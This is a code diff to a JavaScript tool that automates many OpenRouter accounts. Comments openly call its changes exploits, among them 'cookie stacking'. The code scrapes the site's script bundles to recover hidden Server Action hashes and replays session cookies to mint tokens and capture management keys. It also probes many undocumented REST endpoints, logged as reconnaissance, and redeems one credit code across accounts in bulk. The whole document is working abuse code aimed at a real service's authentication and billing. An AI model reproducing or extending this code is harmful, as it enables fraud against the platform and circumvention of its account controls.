@@ -24,6 +24,7 @@ import {
 import * as store from './store.js';
 import { storeManagementKey } from './management-key-store.js';
 import { getCredits } from './openrouter.js';
+import { runInBatches } from './batch-runner.js';
 
 const OR_ORIGIN = (() => {
   try {
@@ -54,14 +55,128 @@ const MGMT_KEY_RE = /sk-or-v1-[A-Za-z0-9_.-]+/;
  * This ID is baked into the Next.js build and will need updating if OpenRouter
  * redeploys with a new build hash.
  */
-const CREATE_MGMT_KEY_ACTION_HASH = config.HYDRA_MGMT_KEY_SERVER_ACTION_ID || '40a4728e6d23484cde9c2e629e0c0cc195dfbbd66b';
+/** Mutable so self-healing can update at runtime */
+let CREATE_MGMT_KEY_ACTION_HASH = config.HYDRA_MGMT_KEY_SERVER_ACTION_ID || '40a4728e6d23484cde9c2e629e0c0cc195dfbbd66b';
 
 /**
  * Next.js Server Action hash for code redemption on /redeem.
  * Captured 2026-04-07 via browser fetch interceptor — stable until OpenRouter redeploys.
  * Override via HYDRA_REDEEM_ACTION_HASH env var if it changes.
  */
-const REDEEM_ACTION_HASH = config.HYDRA_REDEEM_ACTION_HASH || '402002bec2b81db80981bde049958688557404e07a';
+let REDEEM_ACTION_HASH = config.HYDRA_REDEEM_ACTION_HASH || '402002bec2b81db80981bde049958688557404e07a';
+
+// ─── Self-healing hash auto-discovery ──────────────────────────────────────
+// When a Server Action returns 404, the baked-in hash is stale (OpenRouter
+// redeployed).  We fetch the relevant OR page HTML, locate <script> tags,
+// grep for 40-char hex strings near known keywords (redeem, management-keys),
+// and try each candidate against the endpoint.  On success the module-level
+// hash variable is updated so subsequent calls work without a restart.
+
+const HEX40_RE = /[0-9a-f]{40}/g;
+
+/** Known keywords that appear near Server Action hashes in OR's JS bundles. */
+const SA_KEYWORDS = ['redeem', 'management-keys', 'managementKey', 'createManagementKey', 'redeemCode'];
+
+/**
+ * Fetch a page from OpenRouter, extract all <script src="…"> URLs,
+ * fetch each JS bundle, and return an array of 40-char hex candidates
+ * found near any of SA_KEYWORDS.
+ */
+async function discoverServerActionHashes(pageUrl) {
+  try {
+    const pageRes = await fetch(pageUrl, {
+      headers: { 'User-Agent': USER_AGENT },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (!pageRes.ok) return [];
+    const html = await pageRes.text();
+
+    // Collect script src URLs
+    const scriptUrls = [];
+    for (const m of html.matchAll(/<script[^>]+src=["']([^"']+)["']/g)) {
+      let src = m[1];
+      // Normalise relative URLs
+      if (src.startsWith('/')) src = `${OR_ORIGIN}${src}`;
+      else if (!src.startsWith('http')) continue;
+      scriptUrls.push(src);
+    }
+
+    const candidates = new Set();
+    // Fetch each bundle and grep for hex strings near keywords
+    const fetches = scriptUrls.map(async (url) => {
+      try {
+        const jsRes = await fetch(url, {
+          headers: { 'User-Agent': USER_AGENT },
+          signal: AbortSignal.timeout(10000),
+        });
+        if (!jsRes.ok) return;
+        const js = await jsRes.text();
+
+        // Strategy 1: find hex40 within ~200 chars of a keyword
+        for (const kw of SA_KEYWORDS) {
+          let idx = 0;
+          while (true) {
+            const found = js.indexOf(kw, idx);
+            if (found < 0) break;
+            const window = js.slice(Math.max(0, found - 300), found + 300);
+            for (const m of window.matchAll(HEX40_RE)) {
+              candidates.add(m[0]);
+            }
+            idx = found + kw.length;
+          }
+        }
+      } catch { /* bundle fetch failed — skip */ }
+    });
+    await Promise.allSettled(fetches);
+    return [...candidates];
+  } catch (err) {
+    console.warn(`[dashboard-api] Hash auto-discovery page fetch failed: ${err.message}`);
+    return [];
+  }
+}
+
+/**
+ * Try to self-heal a stale Server Action hash by auto-discovering new candidates.
+ * @param {'redeem'|'mgmt-key'} kind - Which hash to repair
+ * @param {string} testUrl - The OR endpoint URL to probe with each candidate
+ * @param {object} baseHeaders - Headers template (will add Next-Action for each candidate)
+ * @param {string} body - Request body
+ * @returns {string|null} The new hash if found, or null
+ */
+async function selfHealHash(kind, testUrl, baseHeaders, body) {
+  const pageUrl = kind === 'redeem'
+    ? `${OR_BASE}/redeem`
+    : `${OR_BASE}/settings/management-keys`;
+
+  console.warn(`[dashboard-api] ⚡ Self-healing ${kind} hash — scanning ${pageUrl} JS bundles…`);
+  const candidates = await discoverServerActionHashes(pageUrl);
+
+  for (const candidate of candidates) {
+    try {
+      const probeHeaders = { ...baseHeaders, 'Next-Action': candidate };
+      const probeRes = await fetch(testUrl, {
+        method: 'POST',
+        headers: probeHeaders,
+        body,
+        signal: AbortSignal.timeout(10000),
+      });
+      // Non-404 means the hash was accepted (even if the action returns an
+      // application-level error like "invalid code", it confirms the route).
+      if (probeRes.status !== 404) {
+        console.warn(`[dashboard-api] ✅ Self-healed ${kind} hash → ${candidate}`);
+        if (kind === 'redeem') {
+          REDEEM_ACTION_HASH = candidate;
+        } else {
+          CREATE_MGMT_KEY_ACTION_HASH = candidate;
+        }
+        return candidate;
+      }
+    } catch { /* probe failed — try next candidate */ }
+  }
+
+  console.warn(`[dashboard-api] ❌ Self-healing ${kind} hash failed — no valid candidate found among ${candidates.length} candidates`);
+  return null;
+}
 
 /**
  * next-router-state-tree header value for the /redeem page — required by Next.js Server Actions.
@@ -466,6 +581,30 @@ async function tryManagementKeyServerActionReplay(sessionCookie, clientCookie, k
         }
 
         // Server Actions often return 200 even on errors (error encoded in RSC payload)
+        // A 404 specifically means the Next-Action hash is stale — try self-healing once
+        if (res.status === 404) {
+          console.warn('[dashboard-api] Mgmt-key Server Action returned 404 — hash may be stale, attempting self-heal…');
+          const newHash = await selfHealHash('mgmt-key', url, headers, body);
+          if (newHash) {
+            // Retry with the discovered hash
+            const retryRes = await fetch(url, {
+              method: 'POST',
+              headers: { ...headers, 'Next-Action': newHash },
+              body,
+            });
+            if (retryRes.ok || retryRes.status === 200) {
+              const { text: retryText, error: retryReadErr } = await safeResponseText(retryRes, 50000);
+              if (!retryReadErr) {
+                const key = extractManagementKeyFromResponseBody(retryText);
+                if (key) {
+                  console.error('[dashboard-api] Self-healed mgmt-key Server Action — captured management key');
+                  return key;
+                }
+              }
+            }
+          }
+          continue;
+        }
         if (!res.ok && res.status !== 200) {
           continue;
         }
@@ -639,6 +778,10 @@ async function captureProvisionDebugArtifacts(page, accountId) {
   }
 }
 
+// Per-account JWT cache — avoids re-calling Clerk /client on every bulk op.
+// Key: sessionCookie (uniquely identifies the session); TTL: 30s with 10s safety margin.
+const _jwtCache = new Map(); // sessionCookie → { token, expiresAt }
+
 /**
  * Get a fresh JWT from Clerk /client endpoint.
  * OTP sessions have short-lived JWTs (60s) but the session itself is long-lived.
@@ -648,9 +791,14 @@ async function captureProvisionDebugArtifacts(page, accountId) {
  * @returns {Promise<string|null>} Fresh JWT or null if refresh failed
  */
 export async function getFreshJwt(sessionCookie, clientCookie) {
+  const cached = _jwtCache.get(sessionCookie);
+  if (cached && Date.now() < cached.expiresAt - 10_000) {
+    return cached.token;
+  }
   try {
     const cookieHeader = `__session=${sessionCookie}; ${clientCookie}`;
-    const url = 'https://clerk.openrouter.ai/v1/client?_clerk_js_version=5.0.0';
+    const clerkJsVersion = process.env.HYDRA_CLERK_JS_VERSION || '5.125.7';
+    const url = `https://clerk.openrouter.ai/v1/client?_clerk_js_version=${clerkJsVersion}`;
     
     const res = await fetch(url, {
       method: 'GET',
@@ -670,15 +818,13 @@ export async function getFreshJwt(sessionCookie, clientCookie) {
     const data = await res.json();
     const session = data?.response?.sessions?.[0] || data?.client?.sessions?.[0];
     
-    if (session?.last_active_token?.jwt) {
-      return session.last_active_token.jwt;
+    const jwt = session?.last_active_token?.jwt ?? session?.jwt ?? null;
+
+    if (jwt) {
+      _jwtCache.set(sessionCookie, { token: jwt, expiresAt: Date.now() + 30_000 });
+      return jwt;
     }
-    
-    // Fallback: try to get JWT from session object itself
-    if (session?.jwt) {
-      return session.jwt;
-    }
-    
+
     console.error('[getFreshJwt] No JWT in /client response');
     return null;
   } catch (err) {
@@ -726,9 +872,11 @@ export async function ensureSession(userId, accountId) {
       // so the caller gets a token that won't expire mid-request.
       const expiryMs = new Date(derivedExpiry).getTime();
       const remainingMs = expiryMs - Date.now();
-      if (remainingMs < 5 * 60 * 1000 && session.clientCookie) {
+      // Exploit #14: Cookie stacking — try stacked cookies for proactive refresh
+      const refreshInput14 = session.clientCookies?.length > 0 ? session.clientCookies : session.clientCookie;
+      if (remainingMs < 5 * 60 * 1000 && (session.clientCookie || session.clientCookies?.length > 0)) {
         console.log(`[ensureSession] JWT expires in ${Math.round(remainingMs/1000)}s, refreshing proactively`);
-        const refreshed = await refreshSession(session.clientCookie, session.sessionCookie);
+        const refreshed = await refreshSession(refreshInput14, session.sessionCookie);
         if (refreshed) {
           await store.updateAccountSession(userId, accountId, refreshed.sessionCookie, refreshed.clientCookie ?? session.clientCookie, refreshed.sessionExpiry);
           return { sessionCookie: refreshed.sessionCookie, clientCookie: refreshed.clientCookie ?? session.clientCookie };
@@ -744,9 +892,11 @@ export async function ensureSession(userId, accountId) {
 
   // JWT expired or missing. Try refreshing via __client device cookie (12-hour lifetime).
   // This is the normal path for OTP accounts after the initial 60s JWT expires.
-  if (session.clientCookie) {
-    console.log(`[ensureSession] JWT expired, refreshing via __client cookie`);
-    const refreshed = await refreshSession(session.clientCookie, session.sessionCookie);
+  // Exploit #14: Cookie stacking — try all stacked cookies newest-first
+  const refreshInput14b = session.clientCookies?.length > 0 ? session.clientCookies : session.clientCookie;
+  if (refreshInput14b) {
+    console.log(`[ensureSession] JWT expired, refreshing via __client cookie(s)`);
+    const refreshed = await refreshSession(refreshInput14b, session.sessionCookie);
     if (refreshed) {
       const cc = refreshed.clientCookie ?? session.clientCookie;
       await store.updateAccountSession(userId, accountId, refreshed.sessionCookie, cc, refreshed.sessionExpiry);
@@ -1525,10 +1675,196 @@ async function tryRestApiCreateKey(sessionCookie, clientCookie, keyName) {
       }
     }
     
+    // ── Expanded REST probe endpoints (EXPLOIT #12) ──
+    // Also try /api/v1/keys with minimal body and additional path variants.
+    const expandedEndpoints = [
+      { url: `${OR_BASE}/api/v1/keys`, method: 'POST', body: { name: keyName } },
+      { url: `${OR_BASE}/api/v1/keys`, method: 'POST', body: { name: keyName, type: 'management' } },
+      { url: `${OR_BASE}/api/v1/keys/create`, method: 'POST', body: { name: keyName } },
+      { url: `${OR_BASE}/api/v1/account/keys`, method: 'POST', body: { name: keyName, type: 'management' } },
+      { url: `${OR_BASE}/api/v1/user/keys`, method: 'POST', body: { name: keyName } },
+      { url: `${OR_BASE}/api/v1/settings/keys`, method: 'POST', body: { name: keyName } },
+    ];
+
+    for (const endpoint of expandedEndpoints) {
+      try {
+        console.error(`[tryRestApiCreateKey] Trying expanded ${endpoint.method} ${endpoint.url}`);
+        const res = await fetch(endpoint.url, {
+          method: endpoint.method,
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${jwtToUse}`,
+            'Cookie': clientCookie,
+            'Origin': OR_ORIGIN,
+            'User-Agent': USER_AGENT,
+          },
+          body: JSON.stringify(endpoint.body),
+        });
+
+        // Log EVERY response status — even 404s tell us what doesn't exist
+        console.error(`[tryRestApiCreateKey] ${endpoint.url} → HTTP ${res.status} ${res.statusText}`);
+
+        if (!res.ok) continue;
+
+        const contentType = res.headers.get('content-type') || '';
+        if (!contentType.includes('application/json')) {
+          console.error(`[tryRestApiCreateKey] ${endpoint.url} returned non-JSON: ${contentType}`);
+          continue;
+        }
+
+        const data = await res.json();
+        const key =
+          data?.key ??
+          data?.managementKey ??
+          data?.apiKey ??
+          data?.secret ??
+          data?.token ??
+          data?.data?.key ??
+          data?.data?.managementKey;
+
+        if (key && key.startsWith('sk-or-v1-')) {
+          console.error(`[tryRestApiCreateKey] Success with expanded ${endpoint.url}`);
+          return { key };
+        }
+      } catch (err) {
+        console.error(`[tryRestApiCreateKey] ${endpoint.url} error: ${err.message}`);
+      }
+    }
+
     return { error: 'All REST endpoints failed' };
   } catch (err) {
     console.error(`[tryRestApiCreateKey] Fatal error: ${err.message}`);
     return { error: err.message };
+  }
+}
+
+/**
+ * Try to redeem a code via REST API using session JWT as Bearer token.
+ * Fallback when Server Action and tRPC both fail.
+ * EXPLOIT #12: REST fallback probes for credit redemption.
+ * @param {string} sessionCookie - Session JWT
+ * @param {string} clientCookie - Client cookies
+ * @param {string} code - Redemption code to apply
+ * @returns {Promise<{success: boolean, result?: any, error?: string, source: string, probedEndpoints: Array}>}
+ */
+async function tryRestApiRedeemCode(sessionCookie, clientCookie, code) {
+  const probedEndpoints = [];
+
+  try {
+    const freshJwt = await getFreshJwt(sessionCookie, clientCookie);
+    const jwtToUse = freshJwt || sessionCookie;
+
+    const endpoints = [
+      // Primary: /api/v1/credits/redeem — most RESTful pattern
+      { url: `${OR_BASE}/api/v1/credits/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/credits/redeem`, method: 'POST', body: { promoCode: code } },
+      { url: `${OR_BASE}/api/v1/credits/redeem`, method: 'POST', body: { code, type: 'promo' } },
+      // Alternate credit paths
+      { url: `${OR_BASE}/api/v1/credits/apply`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/credits/promo`, method: 'POST', body: { code } },
+      // Voucher/coupon endpoints
+      { url: `${OR_BASE}/api/v1/voucher/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/coupon/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/promo/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/promo/apply`, method: 'POST', body: { code } },
+      // Code-based endpoints
+      { url: `${OR_BASE}/api/v1/code/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/code/apply`, method: 'POST', body: { code } },
+      // Account-scoped
+      { url: `${OR_BASE}/api/v1/account/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/account/credits/redeem`, method: 'POST', body: { code } },
+      // User-scoped
+      { url: `${OR_BASE}/api/v1/user/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/v1/user/credits/redeem`, method: 'POST', body: { code } },
+      // Non-v1 variants
+      { url: `${OR_BASE}/api/credits/redeem`, method: 'POST', body: { code } },
+      { url: `${OR_BASE}/api/redeem`, method: 'POST', body: { code } },
+    ];
+
+    for (const endpoint of endpoints) {
+      try {
+        console.error(`[tryRestApiRedeemCode] Trying ${endpoint.method} ${endpoint.url} body=${JSON.stringify(endpoint.body)}`);
+
+        const res = await fetch(endpoint.url, {
+          method: endpoint.method,
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${jwtToUse}`,
+            'Cookie': clientCookie,
+            'Origin': OR_ORIGIN,
+            'Referer': `${OR_ORIGIN}/redeem`,
+            'User-Agent': USER_AGENT,
+          },
+          body: JSON.stringify(endpoint.body),
+        });
+
+        const probeResult = {
+          url: endpoint.url,
+          method: endpoint.method,
+          status: res.status,
+          statusText: res.statusText,
+          contentType: res.headers.get('content-type') || '',
+        };
+
+        // Try to read body for more detail, even on error
+        let bodyText = '';
+        try {
+          bodyText = await res.text();
+          probeResult.bodyPreview = bodyText.slice(0, 500);
+        } catch {
+          probeResult.bodyPreview = '(unreadable)';
+        }
+
+        probedEndpoints.push(probeResult);
+
+        // Log EVERY response — 404s tell us what doesn't exist
+        console.error(`[tryRestApiRedeemCode] ${endpoint.url} → HTTP ${res.status} ${res.statusText} body=${probeResult.bodyPreview.slice(0, 200)}`);
+
+        if (res.ok) {
+          const contentType = res.headers.get('content-type') || '';
+          let data;
+          if (contentType.includes('application/json')) {
+            try { data = JSON.parse(bodyText); } catch { data = null; }
+          }
+
+          // Check for success indicators
+          const success =
+            data?.success === true ||
+            data?.redeemed === true ||
+            data?.applied === true ||
+            data?.credits !== undefined ||
+            data?.balance !== undefined ||
+            (typeof data?.message === 'string' && /success|redeemed|applied|credit/i.test(data.message));
+
+          if (success || res.status === 200 || res.status === 201) {
+            console.error(`[tryRestApiRedeemCode] Redemption may have succeeded at ${endpoint.url}`);
+            return {
+              success: true,
+              result: data || { raw: bodyText.slice(0, 500) },
+              source: 'rest-api',
+              probedEndpoints,
+              probedUrl: endpoint.url,
+            };
+          }
+        }
+      } catch (err) {
+        const probeResult = {
+          url: endpoint.url,
+          method: endpoint.method,
+          status: 0,
+          error: err.message,
+        };
+        probedEndpoints.push(probeResult);
+        console.error(`[tryRestApiRedeemCode] ${endpoint.url} error: ${err.message}`);
+      }
+    }
+
+    // All endpoints probed, none succeeded — return full log
+    console.error(`[tryRestApiRedeemCode] All REST redemption endpoints failed (${probedEndpoints.length} probed)`);
+    return { success: false, error: 'All REST redemption endpoints failed', source: 'rest-api', probedEndpoints };
+  } catch (err) {
+    console.error(`[tryRestApiRedeemCode] Fatal error: ${err.message}`);
+    return { success: false, error: err.message, source: 'rest-api', probedEndpoints };
   }
 }
 
@@ -2739,7 +3075,48 @@ async function redeemCodeViaServerAction(sessionCookie, clientCookie, code) {
   });
 
   if (res.status === 404) {
-    throw new Error('Server Action hash stale — OpenRouter redeployed. Update REDEEM_ACTION_HASH.');
+    // ── Self-healing: attempt to discover the new hash and retry ──
+    const newHash = await selfHealHash('redeem', url, headers, JSON.stringify([code]));
+    if (newHash) {
+      // Retry with the healed hash
+      const retryRes = await fetch(url, {
+        method: 'POST',
+        headers: { ...headers, 'Next-Action': newHash },
+        body: JSON.stringify([code]),
+      });
+      if (retryRes.status !== 404) {
+        // Replace `res` so the rest of the function processes the retry response
+        // (We read retryRes below instead of `res` by reassigning.)
+        // Unfortunately `res` is const, so we fall through to a second parse pass.
+        const retryText = await retryRes.text();
+        for (const line of retryText.split('\n')) {
+          const colonIdx = line.indexOf(':');
+          if (colonIdx < 0) continue;
+          const payload = line.slice(colonIdx + 1);
+          try {
+            const obj = JSON.parse(payload);
+            if (obj?.__kind === 'ERR') {
+              const msg = obj.error?.error?.message || obj.error?.message || 'Redemption failed';
+              const code404 = obj.error?.error?.code === 404 || obj.error?.code === 404;
+              const err = new Error(msg);
+              err.httpStatus = code404 ? 404 : 400;
+              err.redeemErrorKind = 'ERR';
+              err.redeemMeta = obj.error?.error?.metadata;
+              throw err;
+            }
+            if (obj?.__kind === 'OK' || obj?.success || obj?.credits != null) {
+              return { success: true, result: obj, source: 'server-action' };
+            }
+          } catch (e) {
+            if (e.redeemErrorKind) throw e;
+          }
+        }
+        if (retryRes.headers.get('content-type')?.includes('x-component') || retryText.length > 10) {
+          return { success: true, result: { raw: retryText.slice(0, 200) }, source: 'server-action' };
+        }
+      }
+    }
+    throw new Error('Server Action hash stale — OpenRouter redeployed. Self-healing failed.');
   }
   if (res.status === 401 || res.status === 403) {
     throw new Error(`Redeem Server Action auth failed (${res.status}) — session may be expired`);
@@ -2865,6 +3242,25 @@ export async function redeemCode(userId, accountId, code) {
       // Try next
     }
   }
+
+  // ── EXPLOIT #12: REST API fallback probe for credit redemption ──
+  // Try REST endpoints with session JWT as Bearer token before Playwright
+  console.error('[dashboard-api] All tRPC redeem routes exhausted, trying REST API fallback');
+  const restRedeemResult = await tryRestApiRedeemCode(sessionCookie, clientCookie, code);
+  if (restRedeemResult?.success) {
+    console.error(`[dashboard-api] Redemption succeeded via REST API at ${restRedeemResult.probedUrl || 'unknown endpoint'}`);
+    return restRedeemResult;
+  }
+
+  // Log all probed endpoints for reconnaissance even on failure
+  if (restRedeemResult?.probedEndpoints?.length) {
+    console.error(`[dashboard-api] REST redeem probe summary (${restRedeemResult.probedEndpoints.length} endpoints):`);
+    for (const p of restRedeemResult.probedEndpoints) {
+      console.error(`  ${p.method} ${p.url} → ${p.status} ${p.statusText || ''} ${p.error || ''}`);
+    }
+  }
+
+  console.error('[dashboard-api] REST API redemption failed, falling back to Playwright browser automation');
 
   return await redeemCodeViaPlaywright(userId, accountId, sessionCookie, clientCookie, code);
 }
@@ -3075,20 +3471,17 @@ async function redeemCodeViaPlaywright(userId, accountId, sessionCookie, clientC
 }
 
 export async function bulkRedeemCode(userId, accountIds, code) {
-  // Use sequential for...of instead of Promise.all to prevent Playwright OOM crashes when bulk redeeming
-  const results = [];
-  for (const id of accountIds) {
+  return runInBatches(accountIds, async (id) => {
     try {
       const account = await store.getAccountWithKey(userId, id);
       const result = await redeemCode(userId, id, code);
-      results.push({ accountId: id, alias: account.alias, ...result });
+      return { accountId: id, alias: account.alias, ...result };
     } catch (err) {
       console.error('[DASHBOARD] Fetch failed:', err.message);
       const { errorCode, message } = classifyRedeemFailure(err.message, err);
-      results.push({ accountId: id, success: false, message, error: message, errorCode });
+      return { accountId: id, success: false, message, error: message, errorCode };
     }
-  }
-  return results;
+  });
 }
 
 export async function getUserProfile(sessionCookie, clientCookie) {
